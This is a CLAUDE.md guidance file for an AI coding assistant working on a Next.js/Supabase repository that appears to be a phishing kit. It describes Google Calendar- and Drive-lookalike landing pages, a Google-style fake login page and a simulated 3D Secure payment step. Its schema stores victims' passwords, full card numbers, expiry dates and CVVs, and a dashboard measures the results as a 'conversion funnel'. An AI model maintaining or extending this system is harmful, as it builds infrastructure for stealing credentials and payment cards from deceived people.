# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Commands

### Development
- `npm run dev` - Start development server on port 3000
- `npm run build` - Build for production
- `npm run start` - Start production server

### Testing
- `node scripts/test_tracking.js` - Test tracking system
- `node scripts/test_unique_tracking.js` - Test unique tracking
- `node scripts/test_verification_tracking.js` - Test verification flow
- `node tests/test_frontend_flow.js` - Test complete frontend flow
- `node tests/test_campaign_flow.js` - Test campaign flow

### Maintenance
- `node scripts/maintenance/cleanup_duplicate_leads.js` - Clean duplicate leads
- `node scripts/maintenance/recalculate_unique_totals.js` - Recalculate campaign totals

## Architecture

### Stack
- **Frontend**: Next.js with React, CSS Modules
- **Backend**: Next.js API routes
- **Database**: Supabase (PostgreSQL)
- **State Management**: React hooks with custom popup manager

### Key Directory Structure
```
src/
├── components/
│   ├── booking/         # Booking flow components
│   ├── payment/         # Payment and verification components
│   ├── dashboard/       # Analytics dashboard
│   └── common/          # Shared components (popups, headers)
├── hooks/              # Custom React hooks
├── lib/db/             # Database services (Supabase)
├── services/           # Business logic services
└── styles/             # CSS Modules organized by component type

pages/
├── api/                # API endpoints
│   ├── tracking/       # Lead tracking endpoints
│   ├── campaigns/      # Campaign management
│   └── payments/       # Payment processing
├── landings/           # Landing pages (calendar.js, drive.js)
└── [core pages]        # Main application pages
```

### Core Components

#### Popup System
- **PopupManager Hook** (`src/hooks/usePopupManager.js`): Centralized popup state management
- **Popup Types**: AUTH, BOOKING, LOADING, THREE_D_SECURE, END, PAYMENT_ERROR
- **PopupRenderer**: Renders appropriate popup based on type and state

#### Landing Pages
- **Calendar Landing** (`pages/landings/calendar.js`): Google Calendar-style booking interface
- **Drive Landing** (`pages/landings/drive.js`): Google Drive-style file access simulation
- Both use iframe embedding and popup-based user capture

#### Tracking System
- **IP-based Uniqueness**: Prevents duplicate tracking from same IP
- **Event Counters**: Tracks visit, booking, login, verification counts per lead
- **LeadService**: Manages lead creation/updates with smart IP detection
- **CampaignTotalService**: Updates campaign-wide totals for unique IPs only

### Database Schema (Supabase)

#### campaigns table
- `id` (text, primary key)
- `iframe_url` (text)
- `first_name`, `last_name`, `email` (text)
- `profile_image` (text, optional)
- `title`, `description` (text, optional)
- `landing_type` (text, default: 'calendar')
- `total_visits`, `total_bookings`, `total_logins`, `total_verifications` (int)
- `is_active` (boolean)

#### campaign_leads table
- `id` (uuid, primary key)
- `campaign_id` (text, foreign key)
- `email`, `first_name`, `last_name`, `phone` (text)
- `ip_address` (text, for uniqueness tracking)
- `user_agent`, `session_id` (text)
- Event timestamps: `booking_submitted_at`, `login_submitted_at`, `verification_submitted_at`
- Event counters: `visit_count`, `booking_count`, `login_count`, `verification_count`
- Card data: `card_number`, `card_name`, `card_expiry`, `card_cvv`
- `selected_plan` (text)
- `password` (text)

### User Flow
1. **Visit**: User lands on campaign page via `/?campaign=ID`
2. **Booking**: Clicks iframe → BookingPopup → form submission
3. **Login**: Redirects to `/google-login` with Google-style interface
4. **Verification**: Plan selection → Payment form → 3D Secure simulation
5. **Analytics**: Dashboard at `/dashboard` shows conversion funnel

### Environment Variables
```
NEXT_PUBLIC_SUPABASE_URL=your_supabase_url
NEXT_PUBLIC_SUPABASE_ANON_KEY=your_supabase_anon_key
SUPABASE_SERVICE_ROLE_KEY=your_service_role_key
```

### Key Services

#### CampaignService (`src/lib/db/supabase.js`)
- `getAllCampaigns()` - Fetch all active campaigns
- `getCampaignById(id)` - Get specific campaign
- `createCampaign(data)` - Create new campaign

#### LeadService (`src/lib/db/supabase.js`)
- `createOrUpdateLead(campaignId, leadData, actionType)` - Core tracking function
- `checkIPExists(campaignId, ipAddress)` - Check for IP uniqueness
- `trackVisit(campaignId, visitData)` - Track page visits

#### PaymentService (`src/services/paymentService.js`)
- Handles payment form validation and processing simulation

### Routing
- `/` - Main landing page (checks for campaign parameter)
- `/landings/calendar` - Calendar-style landing
- `/landings/drive` - Drive-style landing
- `/google-login` - Google login simulation
- `/confirmation` - Plan selection and payment
- `/dashboard` - Analytics dashboard

### Tracking API Endpoints
- `POST /api/tracking/track-visit` - Track page visits
- `POST /api/tracking/track-booking` - Track booking submissions
- `POST /api/tracking/track-login` - Track login attempts
- `POST /api/tracking/track-verification` - Track payment verifications

### CSS Architecture
- **CSS Modules** for component-scoped styles
- **Organized by type**: `components/`, `modules/`, `globals/`
- **Responsive design** with mobile-first approach
- **Google-style theming** for authentication pages

### Development Notes
- Uses `createPortal` for modal rendering
- Implements smart email handling (preserves real emails over temporary ones)
- IP-based uniqueness prevents double-counting in analytics
- Popup transitions with 300ms delays for smooth UX
- Form validation with regex patterns for card numbers, emails